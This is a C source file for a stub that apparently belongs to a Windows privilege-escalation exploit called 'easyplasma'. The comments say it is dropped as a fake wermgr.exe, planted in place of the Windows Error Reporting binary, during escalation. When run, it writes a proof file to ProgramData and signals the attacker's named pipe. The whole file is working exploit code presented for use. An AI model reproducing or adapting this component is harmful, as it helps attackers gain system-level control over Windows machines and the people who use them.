/*
 * stub.c  Minimal native WER callback
 * Compiled by build.bat, embedded inside easyplasma.exe as a resource.
 * Extracted and dropped as fake wermgr.exe during escalation.
 * Pure Win32 - no .NET dependency, works even with fake %windir%.
 */
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>

int wmain(void) {
    /* Proof file so easyplasma can detect we ran */
    HANDLE hf = CreateFileW(L"C:\\ProgramData\\ep_system_ran.txt",
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        DWORD w; WriteFile(hf, "OK\n", 3, &w, NULL); CloseHandle(hf);
    }

    /* Retry loop: wait for user-side pipe server to be ready */
    for (int i = 0; i < 20; i++) {
        HANDLE h = CreateFileA("\\\\.\\pipe\\easyplasma_esc",
            GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            DWORD r; BYTE ack = 0;
            ReadFile(h, &ack, 1, &r, NULL);
            CloseHandle(h);
            return 0;
        }
        if (GetLastError() == ERROR_PIPE_BUSY)
            WaitNamedPipeA("\\\\.\\pipe\\easyplasma_esc", 1000);
        else
            Sleep(500);
    }
    return 1;
}
